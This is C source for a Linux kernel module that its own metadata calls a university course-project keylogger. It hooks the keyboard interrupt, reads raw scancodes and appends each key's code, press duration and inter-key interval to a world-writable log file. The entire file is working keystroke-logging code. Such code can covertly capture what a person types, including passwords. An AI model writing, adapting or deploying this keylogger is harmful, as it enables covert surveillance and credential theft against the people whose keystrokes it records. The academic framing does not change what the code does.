#include<linux/module.h>
#include<linux/kernel.h>
#include<linux/init.h>
#include<linux/interrupt.h>
#include <linux/fs.h>
#include <linux/keyboard.h>
#include <linux/jiffies.h>

#define KBD_IRQ_LINE 1
#define AUTHOR_NAME "Anna Afanaseva IU7-73"
#define DESCRIPTION "Course project for BMSTU. Keylogger"
#define LICENSE "GPL"

typedef unsigned long int time_tt;

typedef struct {
    time_tt pressTime;
    int interval;
    int duration;
    int code;
} KeyPressedInfo;

typedef struct {
    int irq;
    char *name;
}KBD_IQRQ_STR;


time_tt last_pressed;
KeyPressedInfo keys[3];
char kbd_info[1024];

struct file *f;
char *path = "var/log/kbd.log";

static KBD_IQRQ_STR current_kbd_irq = {
    .irq = KBD_IRQ_LINE,
    .name = "Keyboard irq"
};


int getKey(int scancode){
    int sc = scancode - 128;
    int i;
    for (i = 0; i < 3; i ++){
        if (keys[i].code == sc)
            return i;
	}
    return -1;
}

int isReleased(int scancode){
    if (scancode >> 7)
	   return 1;
    return 0;
}

void setReleasedTime(int index, time_tt msec){
    if (index == -1 || index > 2)
        return;

    last_pressed = msec;
    keys[index].duration = (time_tt)(msec - keys[index].pressTime)*1000/HZ;
}

void emptifyKeyInfo(int index){
    keys[index].code = -1;
}

void newKey(int scancode, time_tt msec){
    int i;
    if (getKey(scancode) != -1)
        return;

    for (i = 0; i < 3; i ++){
        if (keys[i].code == -1)
            break;
    }

    keys[i].code = scancode;
    keys[i].pressTime = msec;
    keys[i].interval = (time_tt)(msec - last_pressed)*1000/HZ;
}

void writeToFile(int index)
{
    f = filp_open(path, O_APPEND | O_CREAT | O_WRONLY, 0777);

    if (IS_ERR(f)){
        printk("File error occured");
        return;
    }

    sprintf(kbd_info, "Code: %d\tDuration: %d msec\tInterval: %d msec\n", 
                        keys[index].code, keys[index].duration, keys[index].interval);
    kernel_write(f, kbd_info, strlen(kbd_info), &f->f_pos);  
    filp_close(f, NULL);
}

static void kbd_tasklet_handler(unsigned long data){
    static int scancode, status;
    time_tt time = jiffies;
    status = inb(0x64);
    scancode = inb(0x60);

    if (isReleased(scancode)){
        int index = getKey(scancode);
        if (index == -1)
            return;
		
        setReleasedTime(index, time);
        writeToFile(index);
        emptifyKeyInfo(index);
    }
    else
        newKey(scancode, time);
}

DECLARE_TASKLET(kbd_tasklet, kbd_tasklet_handler, 0);

static irqreturn_t kbd_irq_handler(int irq, void *dev_id){
    tasklet_schedule(&kbd_tasklet);
    return IRQ_NONE;
}

static int __init module_init_function(void){
    int i;
    int result = request_irq(KBD_IRQ_LINE, kbd_irq_handler,
                            IRQF_SHARED, "kbd_irq_handler", &current_kbd_irq);
    for (i = 0; i < 3; i ++)
        keys[i].code = -1;
	
    last_pressed = jiffies;
	printk(KERN_INFO "Module initialized");  
    return result;
}

static void __exit module_exit_function(void)
{
    synchronize_irq(KBD_IRQ_LINE);
    free_irq(1, &current_kbd_irq);
    tasklet_kill(&kbd_tasklet);
    printk(KERN_INFO "Module exited");
    return;
}

MODULE_LICENSE(LICENSE);
MODULE_AUTHOR(AUTHOR_NAME);
MODULE_DESCRIPTION(DESCRIPTION);

module_init(module_init_function);
module_exit(module_exit_function);
